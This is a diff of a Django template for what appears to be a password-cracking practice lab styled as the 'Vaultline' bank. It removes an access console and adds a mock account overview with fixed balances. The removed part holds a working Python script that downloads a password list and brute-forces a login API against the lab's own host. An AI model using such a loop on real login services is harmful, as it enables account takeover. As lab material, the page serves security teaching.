@@ -1,171 +1,67 @@
 {% extends "base_app.html" %}
 {% load static icons %}
-{% block title %}Access console · {{ SITE_NAME }}{% endblock %}
-{% block page_title %}Access console{% endblock %}
-
-{% block topbar_actions %}
-  <span class="ws-status offline" id="ws-status"><span class="led"></span><span id="ws-status-text">connecting…</span></span>
-  {% if user.is_staff %}
-    <form method="post" action="{% url 'dashboard:new' %}">
-      {% csrf_token %}
-      <button type="submit" class="btn btn-outline">{% icon "zap" "icon" %} Rotate target</button>
-    </form>
-  {% endif %}
-{% endblock %}
+{% block title %}Your vault · {{ SITE_NAME }}{% endblock %}
+{% block page_title %}Account overview{% endblock %}
 
 {% block content %}
-<div id="monitor-root"
-     data-lab-token="{{ lab.lab_token }}"
-     {% if lab.status == 'COMPLETED' %}data-completed="1" data-cracked="{{ cracked_password }}" data-attempts="{{ cracked_attempts }}"{% endif %}>
-
-  <!-- Target account -->
-  <div class="card" style="margin-bottom:22px; background:linear-gradient(150deg, #142430 0%, #0b1017 65%);">
-    <div class="spread" style="flex-wrap:wrap; gap:16px;">
-      <div class="row" style="gap:16px;">
-        <div class="feature-ico" style="margin:0; width:52px; height:52px;">{% icon "lock" "icon" %}</div>
-        <div>
-          <div class="stat-label">Target account · Vaultline Private</div>
-          <div style="font-size:1.5rem; font-weight:700; letter-spacing:-.01em;">
-            <span class="gradient-text mono">{{ lab.username }}</span>
-          </div>
-          <div class="mono faint" style="font-size:.85rem; margin-top:2px;">Account •••• •••• {{ lab.lab_token|slice:":4"|upper }} · USD</div>
-        </div>
-      </div>
-      <div style="text-align:right;">
-        <div id="stat-result" style="margin-bottom:6px;">
-          {% if lab.status == 'COMPLETED' %}<span class="badge badge-completed">Unlocked</span>{% else %}<span class="badge badge-failed">Locked</span>{% endif %}
-        </div>
-        <div class="stat-label">Attempts</div>
-        <div class="mono"><span id="stat-count">{{ lab.attempt_count }}</span> / <span id="stat-max">{{ lab.max_attempts }}</span></div>
-        <span id="stat-status" hidden>{{ lab.status }}</span>
-      </div>
-    </div>
-  </div>
-
-  {% if lab.status == 'EXPIRED' or lab.status == 'LOCKED' %}
-    <div class="notice" style="margin-bottom:20px;">
-      <span class="notice-icon">{% icon "clock" "icon" %}</span>
-      <div>
-        <h3>This session is {{ lab.status|lower }}</h3>
-        <p>Spin up a fresh target with <strong>New target</strong> to try again.</p>
-      </div>
-    </div>
-  {% endif %}
-
-  <p class="subtle" style="max-width:64ch;">
-    You've been authorized to recover access to this account. Use the endpoint and
-    password list below to test every credential until one unlocks the vault.
-  </p>
-
-  <div class="grid grid-2 mt-1">
-    <!-- Left: details -->
-    <div class="card">
-      <div class="card-title">Step 1 · Credentials to test</div>
-
-      <div class="form-row">
-        <label>Account username</label>
-        <div class="copy-field">
-          <code id="d-username" data-copy>{{ lab.username }}</code>
-          <button type="button" data-copy-btn="d-username">{% icon "copy" "icon" %} Copy</button>
-        </div>
-      </div>
-
-      <div class="form-row">
-        <label>Login endpoint (POST)</label>
-        <div class="copy-field">
-          <code id="d-url" data-copy>{{ login_endpoint }}</code>
-          <button type="button" data-copy-btn="d-url">{% icon "copy" "icon" %} Copy</button>
-        </div>
-      </div>
-
-      <a class="btn btn-primary btn-block" href="{{ wordlist_endpoint }}" download="passwords.txt">
-        {% icon "arrow-down" "icon" %} Download passwords.txt
-      </a>
-      <p class="form-help">{{ wordlist.size }} candidate passwords · save it next to your script.</p>
-    </div>
-
-    <!-- Right: the script -->
+<div id="vault-root" {% if just_accessed %}data-just-accessed="1"{% endif %}>
+  <div class="page-head">
     <div>
-      <div class="spread" style="margin-bottom:14px;">
-        <div class="card-title mb-0">Step 2 · Run this script</div>
-        <button type="button" class="btn btn-ghost btn-sm" data-copy-btn="d-code">{% icon "copy" "icon" %} Copy</button>
+      <h1>Welcome back, <span class="gradient-text mono">{{ user.username }}</span></h1>
+      <p class="sub">You're signed in to your Vaultline private account.</p>
+    </div>
+    <span class="chip">{% icon "lock" "icon" %} Secure session</span>
+  </div>
+
+  <!-- Balance card -->
+  <div class="card" style="background:linear-gradient(150deg, #0f2b24 0%, #0b1017 60%); margin-bottom:18px;">
+    <div class="spread" style="flex-wrap:wrap; gap:16px;">
+      <div>
+        <div class="stat-label">Total balance</div>
+        <div class="mono" style="font-size:2.2rem; font-weight:700; letter-spacing:-.02em; margin-top:6px;">$128,940<span class="faint">.20</span></div>
+        <div class="mono faint" style="font-size:.85rem; margin-top:4px;">Vaultline Private · Account •••• 4921 · USD</div>
       </div>
-      <div class="terminal">
-        <div class="terminal-bar">
-          <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
-          <span class="tt">access_test.py</span>
-        </div>
-<pre id="d-code"><span class="c-key">import</span> requests
-
-BASE  = <span class="c-str">"{{ request.scheme }}://{{ request.get_host }}"</span>
-LOGIN = BASE + <span class="c-str">"/api/login/"</span>
-USERNAME = <span class="c-str">"{{ lab.username }}"</span>
-
-<span class="c-comment"># Pull the password list straight from the server</span>
-passwords = requests.get(BASE + <span class="c-str">"/api/wordlist.txt"</span>).text.splitlines()
-
-<span class="c-key">for</span> password <span class="c-key">in</span> passwords:
-    password = password.strip()
-    <span class="c-key">if</span> <span class="c-key">not</span> password:
-        <span class="c-key">continue</span>
-    r = requests.post(LOGIN, json={<span class="c-str">"username"</span>: USERNAME, <span class="c-str">"password"</span>: password})
-    <span class="c-fn">print</span>(password, r.status_code)
-    <span class="c-key">if</span> r.json()[<span class="c-str">"success"</span>]:
-        <span class="c-fn">print</span>(<span class="c-str">"ACCESS GRANTED:"</span>, password); <span class="c-key">break</span>
-</pre>
-      </div>
+      <span class="chip" style="border-color:rgba(47,224,176,.3); color:var(--brand); align-self:flex-start;">{% icon "activity" "icon" %} +2.4% this month</span>
     </div>
   </div>
 
-  <!-- Live access log -->
-  <div class="spread mt-3" style="margin-bottom:14px;">
-    <div class="card-title mb-0">Step 3 · Live access log</div>
-    <div class="chip">Last tried: <span class="mono" id="latest-pw">—</span></div>
+  <div class="grid grid-3">
+    <div class="stat"><div class="stat-top"><span class="stat-label">Available</span><span class="stat-ico">{% icon "zap" "icon" %}</span></div><div class="stat-value" style="font-size:1.5rem;">$96,210</div></div>
+    <div class="stat"><div class="stat-top"><span class="stat-label">Savings</span><span class="stat-ico c">{% icon "layers" "icon" %}</span></div><div class="stat-value" style="font-size:1.5rem;">$28,730</div></div>
+    <div class="stat"><div class="stat-top"><span class="stat-label">Cards</span><span class="stat-ico v">{% icon "lock" "icon" %}</span></div><div class="stat-value" style="font-size:1.5rem;">2</div></div>
   </div>
 
-  <div class="table-wrap">
-    <table class="data">
-      <thead>
-        <tr><th style="width:90px;">#</th><th>Username</th><th>Password</th><th>Result</th><th>Time</th></tr>
-      </thead>
-      <tbody id="attempt-rows">
-        <tr id="empty-row"><td colspan="5">
-          <div class="empty" style="padding:30px;">
-            <div class="empty-ico">{% icon "activity" "icon" %}</div>
-            <h3>Waiting for access attempts</h3>
-            <p>Run your script and watch each login attempt appear here live.</p>
-          </div>
-        </td></tr>
-      </tbody>
-    </table>
+  <div class="card mt-2">
+    <div class="card-title">Recent activity</div>
+    <div class="table-wrap">
+      <table class="data">
+        <thead><tr><th>Date</th><th>Description</th><th>Amount</th></tr></thead>
+        <tbody>
+          <tr><td class="faint mono">Aug 21</td><td>Transfer — Meridian Holdings</td><td class="mono">−$2,400.00</td></tr>
+          <tr><td class="faint mono">Aug 19</td><td>Deposit — Payroll</td><td class="mono" style="color:var(--success)">+$8,150.00</td></tr>
+          <tr><td class="faint mono">Aug 18</td><td>Card — Blue Bottle Coffee</td><td class="mono">−$6.75</td></tr>
+          <tr><td class="faint mono">Aug 17</td><td>Transfer — Savings</td><td class="mono">−$1,000.00</td></tr>
+        </tbody>
+      </table>
+    </div>
   </div>
 </div>
 
-<!-- Celebration overlay -->
+<!-- Celebration overlay (fires once after a successful sign-in) -->
 <div id="win-overlay" class="win-overlay" hidden>
   <canvas id="confetti" class="win-confetti"></canvas>
   <div class="win-card">
     <div class="win-trophy">🔓</div>
     <div class="win-kicker">ACCESS GRANTED</div>
-    <h2 class="win-title">Vault unlocked</h2>
-    <p class="subtle">The password for <span class="mono">{{ lab.username }}</span> was</p>
-    <div class="win-password mono" id="win-password">••••••••</div>
-    <p class="win-meta">Cracked in <span id="win-attempts">—</span> attempts</p>
-    <div class="win-actions">
-      {% if user.is_staff %}
-        <form method="post" action="{% url 'dashboard:new' %}">
-          {% csrf_token %}
-          <button type="submit" class="btn btn-primary btn-lg">{% icon "zap" "icon" %} Rotate target</button>
-        </form>
-      {% endif %}
-      <button type="button" class="btn btn-primary btn-lg" id="win-close">Nice!</button>
+    <h2 class="win-title">You're in.</h2>
+    <p class="subtle">Signed in to <span class="mono">{{ user.username }}</span>'s Vaultline account.</p>
+    <div class="win-actions" style="margin-top:22px;">
+      <button type="button" class="btn btn-primary btn-lg" id="win-close">Enter account</button>
     </div>
   </div>
 </div>
 {% endblock %}
 
 {% block scripts %}
-<script src="{% static 'js/copy.js' %}"></script>
-<script src="{% static 'js/monitor.js' %}"></script>
 <script src="{% static 'js/celebrate.js' %}"></script>
 {% endblock %}
